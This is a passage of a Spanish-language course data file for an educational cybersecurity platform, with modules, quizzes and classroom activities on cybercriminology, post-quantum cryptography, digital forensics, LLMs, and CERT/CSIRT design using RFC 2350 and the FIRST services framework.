                { type: 'video', title: "Cibercrimen, ciberseguridad e ingeniería social: el eslabón humano — LISA Institute", videoId: "s5nEONGW-70" },
                { type: 'text', icon: 'SpyIcon', text: "El ciberespacio ofrece un sentido de anonimato y distancia, lo que puede disminuir las barreras morales." },
            ]
        },
        {
            id: 'ccy_quiz',
            title: "3. Prueba de Conocimiento",
            content: [{
                type: 'quiz',
                quizData: {
                    question: "¿Qué factor del ciberespacio puede facilitar que una persona cometa un delito?",
                    options: [
                        "La velocidad de internet.",
                        "El sentido de anonimato y la distancia con la víctima.",
                        "La cantidad de información disponible."
                    ],
                    correctOptionIndex: 1,
                    feedback: {
                        correct: "¡Muy bien! El anonimato puede hacer que las consecuencias parezcan menos reales.",
                        incorrect: "El anonimato es un poderoso factor psicológico en la cibercriminología."
                    }
                }
            }]
        },
        {
            id: 'ccy_legal',
            title: "4. Aspectos Legales y Éticos",
            content: [
              {
                type: 'interactive',
                title: 'La intersección entre comportamiento, ética y ley:',
                items: [
                    { term: 'Derechos Digitales', definition: 'El debate sobre cómo los derechos humanos, como la libertad de expresión y la privacidad, se aplican en el mundo digital. Esto define los límites de la vigilancia y la investigación.' },
                    { term: 'Ética en la Investigación', definition: 'Estudiar a los cibercriminales plantea dilemas éticos, como la privacidad de los sujetos y el riesgo de participar en foros ilícitos. Los investigadores deben seguir pautas estrictas.' },
                    { term: 'El Valor de la Evidencia Digital', definition: 'La cibercriminología ayuda a entender el contexto de la evidencia digital, pero es el sistema legal el que determina su admisibilidad y peso en un juicio.' }
                ]
              }
            ]
        },
        {
            id: 'ccy_prevention',
            title: "5. Prevención y Conclusión",
            content: [
                { type: 'text', icon: 'HappyUsersIcon', text: "Entender los aspectos éticos y legales nos ayuda a crear mejores estrategias de prevención, enfocadas en la educación y la rehabilitación." },
                { type: 'text', icon: 'CheckCircleIcon', text: "Completaste la ruta. Ahora entiendes el factor humano y normativo detrás del cibercrimen." },
            ]
        }
    ]
  },
  quantum_computing: {
    title: "Ruta: Computación Cuántica y Criptografía",
    description: "Descubre los principios de la computación cuántica y cómo amenaza la criptografía actual, abriendo paso a la criptografía post-cuántica.",
    lastUpdated: "Enero 2025",
    modules: [
      {
        id: 'qc_intro',
        title: "1. ¿Qué es un Qubit?",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "La computación cuántica utiliza 'qubits'. A diferencia de un bit clásico (0 o 1), un qubit puede ser 0, 1, o ambos a la vez gracias a la superposición." },
          { type: 'text', icon: 'ServerIcon', text: "Esta capacidad, junto con el entrelazamiento, les da un poder de cálculo exponencialmente mayor para ciertos problemas." },
        ]
      },
      {
        id: 'qc_threat_video',
        title: "2. El Peligro para la Criptografía",
        content: [
          { type: 'video', title: "El algoritmo de Shor — Ket.G", videoId: "6SlX_FR4wOM" },
          { type: 'text', icon: 'BrokenEnvelopeIcon', text: "Algoritmos como el de Shor, ejecutados en un computador cuántico, podrían romper los sistemas de cifrado (como RSA) que protegen hoy en día el comercio electrónico, los bancos y las comunicaciones." },
        ]
      },
      {
        id: 'qc_post_quantum',
        title: "3. La Defensa: Criptografía Post-Cuántica",
        content: [
            {
                type: 'interactive',
                title: 'Explora las nuevas defensas criptográficas:',
                items: [
                    { term: 'Criptografía Basada en Redes (Lattices)', definition: 'Algoritmos que usan problemas matemáticos complejos en estructuras de red, difíciles de resolver incluso para computadoras cuánticas.' },
                    { term: 'Criptografía Basada en Código', definition: 'Usa la corrección de errores de códigos para crear cifrados resistentes a ataques cuánticos.' },
                    { term: 'Firmas Basadas en Hash', definition: 'Crea firmas digitales seguras que solo se pueden usar una vez, basadas en funciones hash que ya se consideran cuántico-resistentes.' }
                ]
            }
        ]
      },
      {
        id: 'qc_quiz',
        title: "4. Prueba de Conocimiento",
        content: [
          {
            type: 'quiz',
            quizData: {
              question: "¿Cuál es la principal amenaza de la computación cuántica para la ciberseguridad actual?",
              options: [
                "Acelerar las descargas de internet.",
                "Romper los algoritmos de cifrado que protegen nuestros datos.",
                "Crear virus más inteligentes."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Exacto! El algoritmo de Shor, ejecutable en un computador cuántico, podría romper cifrados como RSA.",
                incorrect: "Si bien son potentes, su principal amenaza inmediata es para la criptografía."
              }
            }
          }
        ]
      },
      {
        id: 'qc_standards',
        title: "5. Estándares y Futuro Regulatorio",
        content: [
          {
            type: 'interactive',
            title: 'Preparándose para la era cuántica:',
            items: [
                { term: 'Estandarización del NIST', definition: 'El Instituto Nacional de Estándares y Tecnología de EE.UU. (NIST) está liderando un proceso global para seleccionar y estandarizar algoritmos de criptografía post-cuántica (PQC) que sean seguros contra computadoras cuánticas.' },
                { term: 'Iniciativas Cuánticas Nacionales', definition: 'Gobiernos de todo el mundo están invirtiendo en investigación y desarrollo cuántico, lo que incluye la creación de políticas para gestionar los riesgos de seguridad asociados.' },
                { term: 'Migración Cripto-ágil', definition: 'Un principio de diseño de sistemas que permite cambiar fácilmente los algoritmos criptográficos. Es fundamental para poder migrar a los nuevos estándares PQC cuando estén listos.' }
            ]
          }
        ]
    },
      {
        id: 'qc_conclusion',
        title: "6. El Futuro es Cuántico",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "La transición a la criptografía post-cuántica, guiada por nuevos estándares, es uno de los mayores desafíos de la ciberseguridad en la próxima década." },
          { type: 'text', icon: 'CheckCircleIcon', text: "¡Felicidades! Has completado esta introducción al mundo cuántico." },
        ]
      }
    ]
  },
  forensic_auditing: {
    title: "Ruta: Fundamentos de Auditoría Forense Digital",
    description: "Aprende los procesos clave para investigar incidentes de seguridad, recolectar evidencia digital y analizarla para resolver casos.",
    lastUpdated: "Enero 2025",
    modules: [
      {
        id: 'df_intro',
        title: "1. La Escena del Crimen Digital",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "La forensia digital es la ciencia de encontrar, preservar, analizar y presentar evidencia encontrada en dispositivos digitales." },
          { type: 'text', icon: 'LockIcon', text: "La 'cadena de custodia' es vital: es el registro cronológico que demuestra quién ha manejado la evidencia, garantizando su integridad." },
        ]
      },
      {
        id: 'df_process',
        title: "2. Pasos de la Investigación",
        content: [
            {
                type: 'interactive',
                title: 'Las 4 fases de la investigación forense:',
                items: [
                    { term: 'Adquisición', definition: 'El proceso de crear una copia exacta (imagen forense) de la evidencia digital sin alterarla.' },
                    { term: 'Preservación', definition: 'Asegurar que la evidencia digital no se modifique. Implica mantener una estricta cadena de custodia.' },
                    { term: 'Análisis', definition: 'Examinar la evidencia recuperada para encontrar artefactos y patrones relevantes para la investigación.' },
                    { term: 'Reporte', definition: 'Documentar los hallazgos de manera clara y objetiva para que puedan ser presentados en un tribunal.' }
                ]
            }
        ]
      },
      {
        id: 'df_tools_video',
        title: "3. Herramientas del Investigador",
        content: [
          { type: 'video', title: "Peritaje Informático Forense — Andrés Pablo Marcos Bursztyn", videoId: "2XJNSwrbN6M" },
          { type: 'text', icon: 'AlarmIcon', text: "Un investigador debe diferenciar entre datos volátiles (como la RAM, que se pierde al apagar) y no volátiles (como el disco duro)." },
        ]
      },
      {
        id: 'df_compliance',
        title: "4. Cumplimiento y Normativa",
        content: [
          {
            type: 'interactive',
            title: 'El marco legal del análisis forense:',
            items: [
                { term: 'ISO/IEC 27043:2015', definition: 'Un estándar internacional que establece los principios y procesos para la investigación de incidentes de seguridad de la información, desde la detección hasta la lección aprendida.' },
                { term: 'Admisibilidad Legal de la Evidencia', definition: 'La evidencia digital debe ser recolectada y manejada de una manera que sea aceptable en un tribunal. Esto incluye mantener la cadena de custodia y usar métodos forenses sólidos.' },
                { term: 'Regulaciones de Privacidad (GDPR, etc.)', definition: 'Los investigadores deben tener cuidado de no violar las leyes de privacidad al examinar datos. A menudo se requiere autorización legal para acceder a información personal.' }
            ]
          }
        ]
    },
      {
        id: 'df_quiz',
        title: "5. Prueba de Conocimiento",
        content: [
          {
            type: 'quiz',
            quizData: {
              question: "¿Por qué es crucial la 'cadena de custodia' en una investigación forense?",
              options: [
                "Para acelerar el análisis de datos.",
                "Para garantizar la integridad de la evidencia y su admisibilidad en un juicio.",
                "Para identificar al culpable más rápidamente."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Correcto! Una cadena de custodia intacta demuestra que la evidencia no ha sido manipulada.",
                incorrect: "Su propósito principal es legal y de integridad, no de velocidad."
              }
            }
          }
        ]
      },
      {
        id: 'df_conclusion',
        title: "6. Conclusión del Caso",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "El rol del analista forense es ser un experto objetivo que presenta los hechos digitales, respetando siempre el marco legal y normativo." },
          { type: 'text', icon: 'CheckCircleIcon', text: "¡Caso cerrado! Has completado la ruta de fundamentos forenses." }
        ]
      }
    ]
  },
  artificial_intelligence: {
    title: "Ruta: Inteligencia Artificial y LLMs (Fases I, II y III)",
    description: "Una inmersión interactiva de nivel profesional enfocada en el manejo de modelos de lenguaje, ingeniería de prompts y agentes autónomos.",
    lastUpdated: "Junio 2026",
    modules: [
      {
        id: 'ai_intro',
        title: "1. [Fase I - Básico: 2h] Introducción a la IA Generativa",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "La Inteligencia Artificial (IA) Generativa y los Grandes Modelos de Lenguaje (LLMs) son tecnologías capaces de asimilar, comprender y redactar lenguaje humano de manera fluida y fluida." },
          { type: 'text', icon: 'ServerIcon', text: "Clave técnica de la Fase I (2 Horas Académicas de Estudio Estructurado): Los modelos no 'piensan' racionalmente como las personas. Utilizan redes de arquitectura Transformer para calcular probabilísticamente la siguiente unidad lógica de texto (llamada Token) en una inmensa base de vectores contextuales." },
        ]
      },
      {
        id: 'ai_concepts',
        title: "2. [Fase I - Básico: 2h] Mazo de Vocabulario y Conceptos",
        content: [
          {
            type: 'flashcards',
            title: 'Glosario Esencial de LLMs y Herramientas',
            cards: [
              { front: '¿Qué es un Token?', back: 'La unidad fundamental que un LLM procesa. Un token equivale a unas 4 letras o 3/4 de palabra en promedio.' },
              { front: '¿Qué es la Ventana de Contexto?', back: 'La memoria a corto plazo del modelo. Expresa la cantidad máxima de tokens que puede asimilar a la vez. Los modelos más avanzados pueden manejar desde 128K hasta millones de tokens de contexto.' },
              { front: '¿Qué es una Alucinación?', back: 'Ocurre cuando el LLM genera respuestas que suenan verídicas pero son completamente falsas u omiten hechos reales.' },
              { front: '¿Qué es una API de IA?', back: 'Interfaz programática que permite conectar aplicaciones de software con las neuronas del modelo de IA bajo cobro por volumen de tokens.' }
            ]
          }
        ]
      },
      {
        id: 'ai_video',
        title: "3. [Fase I - Básico: 2h] Video: Arquitectura Transformer",
        content: [
          { type: 'video', title: "Pero, ¿qué es realmente una Red Neuronal? - 3Blue1Brown", videoId: "aircAruvnKk" },
          { type: 'text', icon: 'PointerIcon', text: "Aprende el fundamento matemático: los pesos y sesgos de la red neuronal se entrenan para transformar la representación de la palabra en un espacio multidimensional." },
        ]
      },
      {
        id: 'ai_paradigms',
        title: "4. [Fase I - Básico: 2h] Parejas: Tipos de Entrenamiento",
        content: [
          {
            type: 'memory',
            title: 'Asociación de Métodos de Entrenamiento de IA',
            pairs: [
              { term: 'Aprendizaje Supervisado', definition: 'El modelo se entrena con datos completamente etiquetados (ej. fotos con respuesta correcta).' },
              { term: 'Aprendizaje No Supervisado', definition: 'El algoritmo analiza datos sin marcas previas e intenta agruparlos o buscar patrones.' },
              { term: 'Aprendizaje por Refuerzo', definition: 'El agente aprende interactuando con su entorno mediante premios y castigos virtuales.' },
              { term: 'Ajuste Fino (Fine-Tuning)', definition: 'Entrenar un modelo base con datos especializados de una organización para resolver tareas muy de nichos.' }
            ]
          }
        ]
      },
      {
        id: 'ai_quiz',
        title: "5. [Fase I - Básico: 2h] Cuestionario Inicial H5P",
        content: [
          {
            type: 'h5p_check',
            title: 'Autoevaluación de Conceptos Iniciales',
            description: 'Comprueba los hitos esenciales de la primera fase de aproximación a las herramientas e IA.',
            questions: [
              {
                question: '¿Por qué ocurren las "Alucinaciones" en un Large Language Model?',
                options: [
                  { id: 'q1_o1', text: 'Porque son sistemas estadísticos probabilísticos que predicen el texto coherente, no motores lógicos que constatan verdad objetiva de forma nativa.', isCorrect: true, score: 10 },
                  { id: 'q1_o2', text: 'Debido a un recalentamiento térmico del procesador físico en la tarjeta gráfica de cómputo.', isCorrect: false, score: 0 },
                  { id: 'q1_o3', text: 'Únicamente porque el programador original colocó datos falsificados a propósito.', isCorrect: false, score: 0 }
                ],
                feedback: '¡Exacto! El modelo asocia la coherencia semántica gramatical por sobre la verificación fáctica.'
              },
              {
                question: '¿Qué es el "Sesgo de Datos" en la Inteligencia Artificial?',
                options: [
                  { id: 'q2_o1', text: 'Los prejuicios históricos o mala curación en la información de entrenamiento que el modelo asimila, produciendo respuestas parciales.', isCorrect: true, score: 10 },
                  { id: 'q2_o2', text: 'Un mecanismo de seguridad que impide al usuario utilizar la API de OpenAI.', isCorrect: false, score: 0 },
                  { id: 'q2_o3', text: 'La velocidad de respuesta medida en tokens por segundo.', isCorrect: false, score: 0 }
                ],
                feedback: 'El sesgo algorítmico surge cuando la información previa refleja prejuicios sociales humanos. Corregirlo exige curar muestras balanceadas.'
              }
            ]
          }
        ]
      },
      {
        id: 'ai_prompting_theory',
        title: "6. [Fase II - Intermedio] Ingeniería de Prompts en LLMs",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "La Ingeniería de Prompts (Prompt Engineering) es la disciplina de diseñar instrucciones de forma estratégica para maximizar la exactitud de los LLMs." },
          { type: 'text', icon: 'PointerIcon', text: "Tres técnicas imperativas del nivel Intermedio: 1. Zero-Shot (Dar instrucción directa sin ejemplos). 2. Few-Shot (Proporcionar ejemplos de entrada y salida para que el modelo imite el formato). 3. Chain-of-Thought (Solicitar al modelo descomponer su lógica paso a paso para mejorar drásticamente su precisión matemática y analítica)." },
        ]
      },
      {
         id: 'ai_prompt_h5p',
         title: "7. [Fase II - Intermedio] Evaluación de Prompting",
         content: [
           {
             type: 'h5p_check',
             title: 'Práctica de Ingeniería de Prompts',
             description: 'Evalúa tus habilidades de control e instrucción de modelos.',
             questions: [
               {
                 question: '¿Qué técnica de Prompting obliga al LLM a pensar paso a paso para resolver un problema complejo?',
                 options: [
                   { id: 'p1_o1', text: 'Chain-of-Thought (Cadena de Pensamiento).', isCorrect: true, score: 10 },
                   { id: 'p1_o2', text: 'Zero-Shot (Inferencia directa).', isCorrect: false, score: 0 },
                   { id: 'p1_o3', text: 'Negative Prompting (Instrucción restrictiva).', isCorrect: false, score: 0 }
                 ],
                 feedback: '¡Correcto! Chain-of-Thought estimula las habilidades deductivas ocultas de la red al forzar la concatenación de variables lógicas antes de arrojar el resultado final.'
               },
               {
                 question: 'Si agregamos 3 ejemplos de correos analizados previas al formular una consulta a un modelo, estamos usando:',
                 options: [
                   { id: 'p2_o1', text: 'Few-Shot Prompting (Aprendizaje con pocos ejemplos).', isCorrect: true, score: 10 },
                   { id: 'p2_o2', text: 'Ajuste fino de hardware.', isCorrect: false, score: 0 },
                   { id: 'p2_o3', text: 'Búsqueda semántica.', isCorrect: false, score: 0 }
                 ],
                 feedback: 'El Few-Shot le da una pauta precisa de formato y estilo al LLM reduciendo drásticamente la tasa de error por interpretación.'
               }
             ]
           }
         ]
      },
      {
        id: 'ai_agents',
        title: "8. [Fase III - Avanzado] Agentes Autónomos y APIs",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "La Fase Avanzada introduce los Agentes Autónomos. Un Agente combina un LLM con herramientas de ejecución externa (ej. buscador web, base de datos SQL o calculadora de fórmulas)." },
          { type: 'text', icon: 'CheckCircleIcon', text: "En lugar de limitarse a responder textos interactivos, el agente evalúa su propio progreso en un bucle cerrado (Reasoning & Acting - ReAct), permitiendo automatizaciones complejas a escala corporativa." },
        ]
      },
      {
        id: 'ai_final_quiz',
        title: "9. [Fase III - Avanzado] Evaluación Final Integradora",
        content: [
          {
            type: 'h5p_check',
            title: 'Examen Integral de Cierre — RedCiber',
            description: 'Valida tu preparación en las tres fases del programa de Inteligencia Artificial para el manejo de LLMs.',
            questions: [
              {
                question: '¿Qué componente distingue a un Agente Inteligente de un chatbot tradicional?',
                options: [
                  { id: 'ag1_o1', text: 'La capacidad de invocar de forma autónoma herramientas de sistema (APIs, calculadoras o bases de datos) a través de un bucle de toma de decisiones.', isCorrect: true, score: 10 },
                  { id: 'ag1_o2', text: 'La cantidad total de emojis que incluye en su saludo inicial.', isCorrect: false, score: 0 },
                  { id: 'ag1_o3', text: 'La velocidad de carga en un servidor estático tradicional de internet.', isCorrect: false, score: 0 }
               ],
               feedback: '¡Excelente! Los agentes coordinan pensamiento lógico y llamadas externas de manera autorregulada para solventar metas complejas asignadas.'
              }
            ]
          }
        ]
      }
    ]
  },
  cert_csirt: {
    title: "CERTs y CSIRTs: Diseño y Gestión Estratégica",
    description: "Programa intensivo de posgrado — 8 sesiones presenciales — sobre el ecosistema global de equipos de respuesta a incidentes: estándares FIRST, SIM3/ENISA, RFC 2350, NIST SP 800-61 y redes de cooperación.",
    lastUpdated: "Septiembre 2026",
    modules: [
      {
        id: 'cert_s1',
        title: "Sesión 1: Fundamentos y Ecosistema Global de CERTs/CSIRTs",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Objetivo de la sesión: comprender el origen histórico de los equipos de respuesta a incidentes y diferenciar la terminología (CERT, CSIRT, CIRT, SOC, PSIRT) y los organismos globales que los articulan." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "El primer equipo formal, el CERT/CC, fue creado en 1988 por la Universidad Carnegie Mellon (SEI) tras el gusano Morris. 'CERT' es una marca registrada de Carnegie Mellon en EE.UU.; por eso el término genérico preferido internacionalmente es CSIRT (Computer Security Incident Response Team)." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "FIRST.org agrupa a cientos de equipos de más de 100 países y fija estándares comunes. En Europa, TF-CSIRT y su directorio 'Trusted Introducer' cumplen un rol equivalente; en América, la red CSIRTAmericas (OEA/CICTE) coordina a los CSIRT nacionales del continente." },
          {
            type: 'interactive',
            title: 'Glosario: tipos de equipo',
            items: [
              { term: 'CERT (Computer Emergency Response Team)', definition: "Término histórico y marca registrada de Carnegie Mellon (EE.UU.); en la práctica se usa como sinónimo de CSIRT fuera de ese contexto legal." },
              { term: 'CSIRT (Computer Security Incident Response Team)', definition: 'Término genérico e internacionalmente preferido para un equipo que recibe, revisa y responde a reportes de incidentes dentro de una constituencia definida.' },
              { term: 'SOC (Security Operations Center)', definition: 'Centro de monitoreo continuo (24/7) enfocado en detección temprana; alimenta de alertas al CSIRT, que investiga y coordina la respuesta.' },
              { term: 'PSIRT (Product Security Incident Response Team)', definition: 'Equipo enfocado en vulnerabilidades de un producto o software específico de un fabricante, no en la infraestructura de una organización.' },
            ]
          },
          {
            type: 'activity',
            title: 'Mapa Mundial de CSIRTs',
            duration: '20–25 min',
            groupSize: '6 grupos de 3–4 personas',
            goal: 'Cada grupo investiga el CSIRT nacional de 4 países: su nombre, su tipo de mandato (gubernamental, académico/técnico, coordinador nacional o institucional) y la red regional a la que pertenece. La idea es descubrir que no existe un solo modelo de CSIRT.',
            downloads: [
              {
                label: 'Hoja de trabajo del estudiante (.docx)',
                href: '/materiales/certs-csirts/hoja-estudiante-mapa-mundial-csirts.docx',
                note: 'Instrucciones, cómo clasificar el mandato, dónde investigar y la tabla que cada grupo debe completar.',
              },
            ],
            steps: [
              { title: 'Identifiquen su grupo', minutes: '2 min', detail: 'El docente asigna una letra (A a F) a cada grupo. Busquen sus 4 países abajo y anótenlos en la Tabla del grupo de la hoja de trabajo.' },
              { title: 'Investiguen cada país', minutes: '12 min (~3 min por país)', detail: 'Para cada país averigüen: (a) el nombre del CSIRT nacional, (b) su tipo de mandato y (c) su red regional (FIRST, TF-CSIRT, CSIRTAmericas o APCERT). Anoten dónde lo encontraron. Fuentes: first.org/members, trusted-introducer.org, csirtamericas.org, apcert.org.' },
              { title: 'Márquenlo en el mapa', minutes: '2 min', detail: 'Pasen al mapamundi que proyecta el docente y marquen sus 4 países.' },
              { title: 'Preparen su hallazgo', minutes: '1 min', detail: 'Elijan UNA cosa que les llamó la atención: un país con dos CSIRT, un mandato distinto al resto, una red inesperada…' },
              { title: 'Plenaria', minutes: '5–10 min', detail: 'Cada grupo comparte su hallazgo en 1 minuto. El docente cierra comparando los modelos.' },
            ],
            groupsTitle: 'Grupos y países asignados',
            groups: [
              { name: 'Grupo A — Américas I', items: ['Brasil', 'Canadá', 'Estados Unidos', 'México'] },
              { name: 'Grupo B — Américas II', items: ['Chile', 'Colombia', 'Perú', 'Uruguay'] },
              { name: 'Grupo C — Europa', items: ['Reino Unido', 'Alemania', 'Países Bajos', 'Estonia'] },
              { name: 'Grupo D — Multilateral y Asia I', items: ['Unión Europea', 'Japón', 'Corea del Sur', 'China'] },
              { name: 'Grupo E — Asia-Pacífico y Oceanía', items: ['Singapur', 'India', 'Australia', 'Nueva Zelanda'] },
              { name: 'Grupo F — Variados', items: ['Costa Rica', 'Israel', 'España', 'Panamá'] },
            ],
            closing: 'Entregable: la Tabla del grupo completa y un hallazgo para compartir. Si encuentran más de un CSIRT para un país, anoten ambos: es justamente lo que discutiremos en el cierre.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Por qué 'CSIRT' es el término preferido internacionalmente sobre 'CERT'?",
              options: [
                "Porque 'CERT' es una marca registrada de Carnegie Mellon en EE.UU. y su uso fuera de ese contexto requiere licencia.",
                "Porque CSIRT es un acrónimo más corto de escribir.",
                "Porque 'CERT' ya no se utiliza en ningún país."
              ],
              correctOptionIndex: 0,
              feedback: {
                correct: "Correcto. 'CERT' nació como marca de Carnegie Mellon; 'CSIRT' es el término neutral que adoptó la comunidad internacional (FIRST, TF-CSIRT, CSIRTAmericas).",
                incorrect: "No exactamente. La razón es legal/histórica: 'CERT' es una marca registrada de Carnegie Mellon en EE.UU."
              }
            }
          }
        ]
      },
      {
        id: 'cert_s2',
        title: "Sesión 2: Mandato, Constituencia y Marco Normativo (RFC 2350)",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Objetivo de la sesión: definir el mandato, la constituencia y las políticas de comunicación de un CSIRT siguiendo la plantilla estándar RFC 2350, y ubicar ese mandato dentro del marco normativo vigente (NIS/NIS2 en la UE, leyes nacionales de ciberseguridad)." },
          { type: 'text', icon: 'LockIcon', text: "RFC 2350 ('Expectations for Computer Security Incident Response', IETF, 1998) es la plantilla de referencia con la que un CSIRT publica sus 'expectativas': quién es, a quién sirve (constituencia), qué servicios ofrece, cómo clasifica la información y cómo puede ser contactado." },
          { type: 'text', icon: 'LockIcon', text: "La Directiva NIS2 de la Unión Europea obliga a los Estados miembro a designar CSIRT nacionales con capacidades mínimas y a sectores 'esenciales/importantes' a reportar incidentes en plazos definidos. Fuera de la UE, cada país suele tener su propia ley marco de ciberseguridad que define el mandato del CSIRT de gobierno." },
          {
            type: 'interactive',
            title: 'Glosario: mandato y constituencia',
            items: [
              { term: 'Constituencia (constituency)', definition: 'La comunidad, red u organización a la que el CSIRT tiene mandato de servir; puede ser una empresa, un sector, un país o una red académica.' },
              { term: 'Mandato', definition: 'La autoridad formal (legal, contractual o jerárquica) que habilita al CSIRT a actuar, incluyendo su alcance y sus límites.' },
              { term: 'Documento RFC 2350', definition: 'Declaración pública de un CSIRT con su misión, constituencia, servicios y políticas, siguiendo la plantilla estándar del IETF.' },
              { term: 'NIS2', definition: 'Directiva de la Unión Europea (sucesora de NIS) que exige a los Estados miembro fortalecer sus CSIRT nacionales y obliga a sectores críticos a reportar incidentes.' },
            ]
          },
          {
            type: 'activity',
            title: 'Taller RFC 2350',
            duration: '40–45 min',
            groupSize: '6 grupos de 3–4 personas',
            goal: 'Cada grupo es el equipo fundador de un CSIRT ficticio y redacta su RFC 2350 simplificado (máx. una página). Lo más importante es definir bien la constituencia —a quién sirve y a quién NO— y la autoridad: de dónde viene el mandato y hasta dónde puede actuar el equipo.',
            downloads: [
              {
                label: 'Hoja de trabajo del estudiante (.docx)',
                href: '/materiales/certs-csirts/hoja-estudiante-taller-rfc2350.docx',
                note: 'Los 6 escenarios, un ejemplo de carta constitutiva, la plantilla RFC 2350 para completar y la lista de revisión para retroalimentar a otro grupo.',
              },
            ],
            steps: [
              { title: 'Lean su escenario', minutes: '3 min', detail: 'El docente asigna una letra (A a F). Lean su escenario en la hoja de trabajo y fíjense en el "punto de tensión": es lo que más tendrán que resolver.' },
              { title: 'Redacten su RFC 2350', minutes: '20 min', detail: 'Completen la plantilla. Empiecen por la sección 3 (Carta constitutiva: misión, constituencia, afiliación y autoridad); el resto se deriva de ella. Pueden inventar los datos de contacto.' },
              { title: 'Expongan', minutes: '2 min por grupo', detail: 'Lean su misión, constituencia y autoridad, y expliquen cómo resolvieron el punto de tensión.' },
              { title: 'Retroalimenten a otro grupo', minutes: '5 min', detail: 'Con la lista de revisión de la hoja, revisen el documento del grupo que indique el docente (A→B, B→C… F→A): una fortaleza y una mejora concreta.' },
              { title: 'Cierre', minutes: '5–10 min', detail: 'El docente compara cómo cambian la constituencia y la autoridad según el tipo de organización.' },
            ],
            groupsTitle: 'Grupos y escenarios asignados',
            groups: [
              { name: 'Grupo A — CSIRT universitario', items: ['Universidad Andina de Tecnología'] },
              { name: 'Grupo B — CSIRT financiero', items: ['Banco Regional del Pacífico'] },
              { name: 'Grupo C — CSIRT sectorial de salud', items: ['Ministerio de Salud'] },
              { name: 'Grupo D — Infraestructura crítica', items: ['Electrificadora Nacional S.A.'] },
              { name: 'Grupo E — CSIRT municipal', items: ['Alcaldía de una ciudad intermedia'] },
              { name: 'Grupo F — Proveedor de servicios', items: ['NubeSur (internet y nube)'] },
            ],
            closing: 'Entregable: el RFC 2350 simplificado de su CSIRT y la lista de revisión completada para otro grupo. Recuerden: un buen RFC 2350 dice tanto a quién sirve el equipo como a quién NO.',
          },
          {
            type: 'flashcards',
            title: 'Secciones clave de un documento RFC 2350',
            cards: [
              { front: 'Información de contacto', back: 'Nombre del equipo, dirección, canales de comunicación (correo, teléfono, PGP) y horario de disponibilidad.' },
              { front: 'Constituencia', back: 'Definición precisa de a quién sirve el CSIRT: qué organización, red o sector cubre su mandato.' },
              { front: 'Políticas', back: 'Cómo clasifica y comparte información (p. ej. con TLP) y qué tipos de incidentes atiende, con qué prioridad.' },
              { front: 'Servicios', back: 'Catálogo de servicios ofrecidos: gestión de incidentes, alertas, análisis de vulnerabilidades, entre otros.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué elemento del RFC 2350 responde a la pregunta 'a quién sirve este CSIRT'?",
              options: [
                "Constituencia",
                "Políticas de retención de logs",
                "Horario de atención telefónica"
              ],
              correctOptionIndex: 0,
              feedback: {
                correct: "Correcto. La constituencia delimita el alcance del mandato del CSIRT.",
                incorrect: "No exactamente. La constituencia es la sección que define a quién sirve el equipo."
              }
            }
          }
        ]
      },
      {
        id: 'cert_s3',
        locked: true,
        title: "Sesión 3: Modelo de Servicios — FIRST CSIRT Services Framework v2.1",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Objetivo de la sesión: conocer el FIRST CSIRT Services Framework v2.1 — el estándar internacional para catalogar servicios de un CSIRT — y aplicarlo al diseño de un portafolio de servicios según el mandato y la constituencia de una organización." },
          { type: 'text', icon: 'ServerIcon', text: "El FIRST CSIRT Services Framework v2.1 (2019, desarrollado con TF-CSIRT y la UIT) organiza el trabajo de un CSIRT en 5 áreas con 21 servicios asociados: Gestión de Eventos de Seguridad de la Información, Gestión de Incidentes de Seguridad de la Información, Gestión de Vulnerabilidades, Conocimiento de la Situación (Situational Awareness) y Transferencia de Conocimiento." },
          { type: 'text', icon: 'ServerIcon', text: "Ningún CSIRT ofrece los 21 servicios: cada equipo elige su portafolio según su mandato, su constituencia y sus recursos. Un CSIRT académico pequeño puede limitarse a 3-4 servicios básicos; un CSIRT nacional maduro puede cubrir la mayoría de las 5 áreas." },
          {
            type: 'interactive',
            title: 'Glosario: las 5 áreas del framework FIRST',
            items: [
              { term: 'Gestión de Eventos de Seguridad de la Información', definition: 'Monitoreo, detección y triage inicial de eventos que podrían convertirse en incidentes.' },
              { term: 'Gestión de Incidentes de Seguridad de la Información', definition: 'Investigación, contención, erradicación y recuperación ante incidentes confirmados.' },
              { term: 'Gestión de Vulnerabilidades', definition: 'Descubrimiento, análisis, coordinación de divulgación y remediación de vulnerabilidades.' },
              { term: 'Conocimiento de la Situación (Situational Awareness)', definition: 'Generación de alertas, boletines y análisis de tendencias para la constituencia.' },
              { term: 'Transferencia de Conocimiento', definition: 'Capacitación, sensibilización y desarrollo de buenas prácticas hacia la constituencia.' },
            ]
          },
          { type: 'text', icon: 'CalendarIcon', text: "Actividad presencial: en equipos, diseñar el portafolio de servicios (eligiendo entre las 5 áreas del framework) para un escenario asignado — hospital, banco regional, universidad o ministerio — justificando qué servicios son prioritarios según el mandato y los recursos disponibles." },
          {
            type: 'memory',
            title: 'Asociar cada área de servicio con su definición',
            pairs: [
              { term: 'Gestión de Eventos', definition: 'Monitoreo, detección y triage inicial de eventos que podrían convertirse en incidentes.' },
              { term: 'Gestión de Incidentes', definition: 'Investigación, contención, erradicación y recuperación ante incidentes confirmados.' },
              { term: 'Gestión de Vulnerabilidades', definition: 'Descubrimiento, análisis, coordinación de divulgación y remediación de vulnerabilidades.' },
              { term: 'Conocimiento de la Situación', definition: 'Generación de alertas, boletines y análisis de tendencias para la constituencia.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Cuántas áreas de servicio define el FIRST CSIRT Services Framework v2.1?",
              options: [
                "5 áreas con 21 servicios asociados",
                "10 áreas obligatorias para todo CSIRT",
                "Una sola área centrada en el malware"
              ],
              correctOptionIndex: 0,
              feedback: {
